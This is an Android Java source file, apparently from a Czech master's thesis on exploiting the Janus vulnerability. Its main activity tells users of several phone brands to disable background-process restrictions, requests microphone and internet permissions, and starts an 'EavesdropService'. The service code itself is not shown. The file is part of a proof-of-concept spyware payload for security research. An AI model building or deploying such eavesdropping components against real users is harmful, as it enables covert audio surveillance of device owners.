// Tento kód je součást diplomové práce Využití zranitelnosti Janus na operačním systému Android
// Autor: Bc. Vít Souček

package com.example.eavesdropservice;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String TAG = "EAVESDROP";

        // Řešení problému s ukončováním procesů na pozadí
        Context context = getApplicationContext();
        CharSequence text = "";
        int duration = Toast.LENGTH_LONG;
        String manufacturer = android.os.Build.MANUFACTURER;
        if ("xiaomi".equalsIgnoreCase(manufacturer)) {
            text = "Please enable Autostart permission in the Security app, turn off Battery Saver and set this app as Protected.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("asus".equalsIgnoreCase(manufacturer)) {
            text = "Please uncheck \"Clean up in suspend\" and \"Auto-deny apps from auto starting\" in the Settings.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("wiko".equalsIgnoreCase(manufacturer)) {
            text = "Please turn off Eco Mode in the Phone Assistant and add the app to the Background Apps Whitelist.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("meizu".equalsIgnoreCase(manufacturer)) {
            text = "Please set Power plan to Performance and check this app as protected in the Battery manager.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("oneplus".equalsIgnoreCase(manufacturer)) {
            text = "Please turn off Battery Optimization in Special Access and enable App Auto-Launch for this app.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("samsung".equalsIgnoreCase(manufacturer)) {
            text = "Please disable all restrictions on this app in Sleeping Apps settings";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else if ("huawei".equalsIgnoreCase(manufacturer)) {
            text = "Please enable \"Ignore Battery Optimization\" and make this app protected in the Battery settings.";
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        }

        // Vyžádání oprávnění RECORD_AUDIO
        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "Asking for Record Audio perm");

            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.RECORD_AUDIO},
                    1);

        }

        // Vyžádání oprávnění INTERNET
        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "Asking for Internet perm");

            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.INTERNET},
                    1);

        }

        // Spuštění služby
        Intent intent = new Intent(this, EavesdropService.class);
        startService(intent);
    }
}
